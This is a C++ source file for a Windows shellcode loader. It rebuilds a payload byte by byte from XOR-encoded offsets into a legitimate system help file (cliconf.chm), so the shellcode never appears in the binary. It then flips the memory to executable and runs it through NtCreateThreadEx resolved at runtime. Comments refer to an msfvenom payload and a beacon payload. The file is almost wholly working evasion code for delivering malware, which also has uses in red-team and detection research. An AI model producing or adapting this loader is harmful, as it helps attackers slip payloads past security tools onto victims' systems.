//
//  cl.exe alphabet-loader-segments.cpp /D"_UNICODE" /D"UNICODE" /W0
//
#include <windows.h>
#include <stdio.h>

#include <synchapi.h>

#include "shellcode.h"

// Alphabet Soup Offsets for msfvenom calc, moved to shellcode.h for flexibility and to simplify the use of the python encoder helper
/*
unsigned long long alphabetSoup[] = {
    4660, 18274, 19562, 67286, 67490, 82347, 58255, 55850, 11517, 78235, 11207, 67312,
    63106, 53765, 76979, 51487, 61601, 42896, 49663, 31257, 33927, 40826, 97872, 60471,
    39179, 80449, 30873, 55773, 73358, 18824, 84126, 43050, 48375, 36078, 69535, 55281,
    29350, 60425, 46156, 70929, 27331, 60546, 63514, 43138, 8061, 32171, 76749, 57105,
    40666, 42570, 54106, 5381, 26667, 96273, 23041, 20926, 45105, 83209, 43016, 36926,
    19584, 759, 31799, 96385, 29277, 71625, 658, 20898, 46156, 75091, 36562, 63217,
    32252, 18276, 20082, 46406, 96105, 97935, 69259, 82403, 67571, 12027, 14827, 10746,
    61409, 65527, 75011, 96596, 32632, 68718, 78104, 83115, 64316, 82052, 33768, 57141,
    72283, 41134, 95702, 84466, 85673, 3696, 26886, 96893, 39483, 23271, 41651, 3362,
    68468, 55281, 6720, 82986, 44277, 1705, 28515, 71249, 59249, 79327, 58868, 74132,
    49433, 19674, 22568, 43897, 33427, 31320, 88091, 34531, 64614, 45042, 95075, 76458,
    28307, 63163, 651, 33746, 38322, 2038, 42752, 51820, 67781, 61382, 67207, 16453,
    58890, 60662, 46979, 96290, 4814, 5913, 83115, 1403, 47113, 68324, 85603, 61391,
    80038, 88384, 26096, 25204, 52013, 1705, 35941, 94816, 54723, 36104, 72645, 33370,
    76112, 31968, 35382, 72858, 32662, 97875, 40082, 69989, 74486, 63000, 78699, 69751,
    51524, 18295, 57306, 64727, 47863, 40802, 16522, 24833, 32153, 88740, 40255, 18669,
    61227, 45792, 51937, 44065, 56572, 67775, 56860, 25498, 42171, 63173, 32571, 32622,
    18221, 29795, 7983, 10965, 11823, 9950, 11459, 11186, 13521, 11448, 87135, 54212,
    78303, 39710, 895, 16258, 64024, 23012, 43353, 53123, 97998, 82785, 79132, 78332,
    55762, 32453, 82913, 24997, 41308, 60233, 94286, 72408, 59332, 95692, 70915, 44640,
    86190, 30584, 46428, 86887, 25949, 83133, 26623, 55014, 25618, 61978, 27560, 35853,
    31974, 33604, 4916, 45041, 68947, 64535, 86981, 18318, 74405, 16233, 71645, 66637,
    39031, 74272, 21532, 94788, 3193, 5930, 3871, 78261, 56407, 33868, 56831, 4485,
    10670
};*/

const size_t soupSize = sizeof(alphabetSoup) / sizeof(alphabetSoup[0]);
size_t payloadSize = soupSize - 1; // shellcode size is total minus the key   

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartAddress,
    PVOID Parameter,
    ULONG CreateFlags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID BytesBuffer
);

BOOL Reconstruct(PVOID dictionaryBase, PVOID destinationAddress) {
    printf("[+] Parsing encoded data.\n");
    // extract the key from the first element
    DWORD activeKey = (DWORD)alphabetSoup[0];    

    printf("[+] Reconstructing payload...\n");
    // reconstruction
    // Every byte of shellcode is retrieved from the CHM file based on the offset recipe
    for (size_t i = 1; i < soupSize; i++) {
        // Decode the offset
        unsigned long long realOffset = alphabetSoup[i];
        if (activeKey != 0) { realOffset ^= activeKey; }
        //*((BYTE*)pDestination + (i - 1)) = *((BYTE*)pChmBase + (DWORD)realOffset);
        *((BYTE*)destinationAddress + (i - 1)) = *((BYTE*)dictionaryBase + (DWORD)realOffset);
    }

    printf("[+] Updating memory protection to RX\n");
    // Change Protection to RX
    DWORD oldProtect;
    BOOL protectUpdate = VirtualProtect(destinationAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
    if(!protectUpdate) return false;

    return true;
}

BOOL ReconstructSegment(PVOID dictionaryBase, PVOID destinationAddress, SIZE_T segmentStart, SIZE_T segmentEnd) {
    // validation: make sure we don't process index 0 (the key) as data
    if (segmentStart == 0) segmentStart = 1; 
    // validation: make sure the start and end values are not out of bounds
    if (segmentStart >= segmentEnd || segmentEnd > soupSize) {
        printf("[-] ERROR: Invalid segment boundaries.\n");
        return FALSE;
    }

    DWORD activeKey = (DWORD)alphabetSoup[0];
    printf("[+] Reconstructing segment [%llu to %llu]...\n", (unsigned long long)segmentStart, (unsigned long long)segmentEnd);

    for (size_t i = segmentStart; i < segmentEnd; i++) {
        unsigned long long realOffset = alphabetSoup[i];
        if (activeKey != 0) { realOffset ^= activeKey; }

        // destinationAddress is the base of our VirtualAlloc'd buffer
        // i-1 accounts for the key being at alphabetSoup[0]
        ((BYTE*)destinationAddress)[i - 1] = ((BYTE*)dictionaryBase)[(DWORD)realOffset];
    }

    return TRUE;
}

void Execute(PVOID pEntryPoint) {
    // Execute via NtCreateThreadEx
    HANDLE hThread = NULL;
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    if (NtCreateThreadEx) {
        NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), pEntryPoint, NULL, FALSE, 0, 0, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }
}

int main() {
    // Map the dictionary file (the source)
    HANDLE hFile = CreateFileA("C:\\Windows\\Help\\mui\\0409\\cliconf.chm", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID pChmBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    printf("[+] DEBUG: soupSize = %i\n", soupSize);
    printf("[+] DEBUG: payloadSize = %i\n", payloadSize);    

    printf("[+] Allocating memory for decoded payload\n");
    // Allocate Destination Memory (RW)
    PVOID pDestination = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDestination) return -1;

    // Decode the payload
    BOOL reconstructRet;

    // reconstruct the entire payload at once
    printf("[+] Running Reconstruct().\n");    
    reconstructRet = Reconstruct(pChmBase, pDestination);
    if(!reconstructRet) return -1;

    // reconstruct the payload in segments (chunks)
    /*
    printf("Running ReconstructSegment().\n");
    reconstructRet = ReconstructSegment(pChmBase, pDestination, 1, 100);
    if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 100, 276);
    if(!reconstructRet) return -1;

    //reconstructRet = ReconstructSegment(pChmBase, pDestination, 1, 276);
    //if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 1, 100);
    if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 100, 150);
    if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 150, 200);
    if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 200, 250);
    if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 250, 260);
    if(!reconstructRet) return -1;    

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 260, 276);
    if(!reconstructRet) return -1;

    reconstructRet = ReconstructSegment(pChmBase, pDestination, 276, 287640);
    if(!reconstructRet) return -1;
    */
    
    DWORD oldProtect;
    // update memory protection to RX
    VirtualProtect(pDestination, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Running Execute().\n");
    Execute(pDestination);
    
    // back to RW
    printf("[+] Changing memory protection back to RW\n");
    VirtualProtect(pDestination, payloadSize, PAGE_READWRITE, &oldProtect);

    printf("[+] Running clean up.\n");
    // Cleanup mappings
    UnmapViewOfFile(pChmBase);
    CloseHandle(hMap);
    CloseHandle(hFile);    
    
    // results in access violation when using beacon payload
    printf("[+] Clearing buffer\n");
    ZeroMemory(pDestination, payloadSize);

    printf("[+] Done.\n");
    return 0;
}